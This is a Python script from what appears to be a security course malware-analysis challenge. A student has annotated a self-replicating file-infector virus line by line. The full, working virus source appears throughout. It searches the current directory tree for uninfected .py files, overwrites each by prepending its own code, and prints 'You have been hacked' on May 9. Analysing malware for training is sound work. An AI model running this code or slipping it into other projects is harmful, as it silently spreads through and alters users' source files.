#!/usr/bin/python3

# Script Name:                  Ops 301d8 Challenge 14
# Commentor:                       David Prutch
# Date of latest revision:      06/16/2023
# Purpose:                      Analyzing Malware
##########
# Warning DO NOT run this code unless you are in a protected environment
# This is for analysis purposes only
# Note I did not write this script, I am only filling in the comments from analysis.
##########

# This line imports the os module
import os
# This line imports the datetime module
import datetime

# Creates variable with value VIRUS
SIGNATURE = "VIRUS"

# Defining the function locate, accepts path as parameter.
# Recursively searches the path for .py files without the virus signature and returns a list of uninfected files.
def locate(path):
    # Creates an empty list called files_targeted
    files_targeted = []
    # Uses os.listdir() function to get the files and directories in the provided path and stores it in a variable.
    filelist = os.listdir(path)
    # Loop that iterates over the list stored in filelist variable.
    for fname in filelist:
        # Using os.isdir() function to check if this list item is a directory.
        if os.path.isdir(path+"/"+fname):
            # if it is a directory this line appends all the directory contents to the files_targeted list.
            files_targeted.extend(locate(path+"/"+fname))
        # If it is not a directory this is checking to see if it is a file with a .py by comparing the last 3 characters of the file name to string ".py"    
        elif fname[-3:] == ".py":
            # Boolean Variable set to false
            infected = False
            # Nested loop 
            # Opens the file and iterates over each line
            for line in open(path+"/"+fname):
                # Checking if value of SIGNATURE is present in the file
                if SIGNATURE in line:
                    # if it is change the value of infected to true
                    infected = True
                    # Break this loop and continue
                    break
            # If file is not infected, never met above requirements and infected remains = to False
            if infected == False:
                # File is appended to file_targeted list
                files_targeted.append(path+"/"+fname)
    # Returns complete files_targeted list of all uninfected files
    return files_targeted

# Defining the function infect, takes files_targeted as parameter.
# This Infects the uninfected files with the virus code.
def infect(files_targeted):
    # creates virus variable and sets its value as absolute path of this script file using "__file__"
    virus = open(os.path.abspath(__file__))
    # creating an empty string
    virusstring = ""
    # Initiating a loop, enumerate() function provides the index and line
    for i,line in enumerate(virus):
        # Only iterates over line indecies 0 - 38
        if 0 <= i < 39:
            # appends line to virus string
            virusstring += line
    # Closes the virus file
    virus.close
    # Loop to iterate over files_targeted list
    for fname in files_targeted:
        # Opens the file
        f = open(fname)
        # reads file into temp variable
        temp = f.read()
        # Closes file
        f.close()
        # Opens file to write to it
        f = open(fname,"w")
        # Concats virus string with temp and writes to file
        f.write(virusstring + temp)
        # Closes the file
        f.close()

# Defines function detonate
# Prints the message on a specific date.
def detonate():
    # gets the current date and time then checks to see if it is may 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # If the dates match print the following statement
        print("You have been hacked")

# Calls the locate function and saves file tree of current directory to the files_targeted variable as a list, empty string uses current directory path
files_targeted = locate(os.path.abspath(""))
# Calls infect function with files_targeted as the argument and injects virus code into each .py file
infect(files_targeted)
# Calls the detonate function.
# prints "You have been hacked if current date is May, 9"
detonate()
